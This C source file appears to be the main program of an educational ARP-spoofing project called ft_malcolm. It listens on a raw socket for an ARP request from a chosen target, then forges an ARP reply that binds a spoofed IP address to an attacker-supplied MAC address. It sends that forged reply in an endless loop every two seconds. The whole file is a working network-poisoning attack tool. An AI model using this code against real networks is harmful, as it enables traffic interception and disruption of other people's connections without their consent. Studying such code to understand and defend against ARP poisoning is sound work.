#include "../include/ft_malcolm.h"

int fdsock = 0;

void    handle_sig_int(int signum)
{
    printf("\n%s\n", EXIT_MSG);
    close(fdsock);
    exit(0);
}

void    prepare_packet(int ifindex, struct ethhdr *eth_frame, struct ether_arp *arp, char **av)
{
    struct ifaddrs iface = {0};

    if (interface_from_index(ifindex, &iface) < 0)
        return ;
    printf("\nFound available interface: %s\n", iface.ifa_name);

    ft_memcpy(eth_frame->h_source, ((struct sockaddr_ll *)iface.ifa_addr)->sll_addr, ETH_ALEN);
    string_to_addr(av[4], eth_frame->h_dest, 16, ETH_ALEN, ':');

    arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
    string_to_addr(av[1], arp->arp_spa, 10, 4, '.');
    string_to_addr(av[2], arp->arp_sha, 16, ETH_ALEN, ':');
    string_to_addr(av[3], arp->arp_tpa, 10, 4, '.');
    string_to_addr(av[4], arp->arp_tha, 16, ETH_ALEN, ':');
}

int     receiver_packet(char **av, struct ethhdr *eth_frame, struct ether_arp *arp, struct sockaddr_ll *src_addr, uint8_t *packet)
{
    socklen_t src_addr_len = sizeof(struct sockaddr_ll);

    if ((fdsock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        printf("%s: Socket error\n", av[0]);
        usage(av[0]);
        return -1;
    }
    while ((ntohs(eth_frame->h_proto) != ETH_P_ARP) ||
           (ntohs(arp->ea_hdr.ar_op) != ARPOP_REQUEST) ||
           (*(in_addr_t *)arp->arp_tpa != inet_addr(av[1])) ||
           (*(in_addr_t *)arp->arp_spa != inet_addr(av[3])) ) {
        recvfrom(fdsock, packet, IP_MAXPACKET, 0, (struct sockaddr*)src_addr, &src_addr_len);
    }
    return 0;
}

void    sender_packet(uint8_t *packet, struct sockaddr_ll *src_addr)
{
    while (42) {
        sendto(fdsock, packet, sizeof(struct ethhdr)+sizeof(struct ether_arp),
            0, (struct sockaddr *)src_addr, sizeof(struct sockaddr_ll));
        sleep(2);
    }
}

int     main(int ac, char **av)
{
    uint8_t packet[IP_MAXPACKET] = {0};
    struct ethhdr *eth_frame = (struct ethhdr *)packet;
    struct ether_arp *arp = (struct ether_arp *)(packet + sizeof(struct ethhdr));
    struct sockaddr_ll src_addr = {0};

    signal(SIGINT, &handle_sig_int);
    if (check(ac, av) < 0)
        return usage(av[0]);

    if (receiver_packet(av, eth_frame, arp, &src_addr, packet) < 0)
        return 1;

    print_info(eth_frame, arp, "REPLY");
    prepare_packet(src_addr.sll_ifindex, eth_frame, arp, av);
    print_info(eth_frame, arp, "RESPONSE");

    sender_packet(packet, &src_addr);

    printf("\n%s\n", EXIT_MSG);
    close(fdsock);
}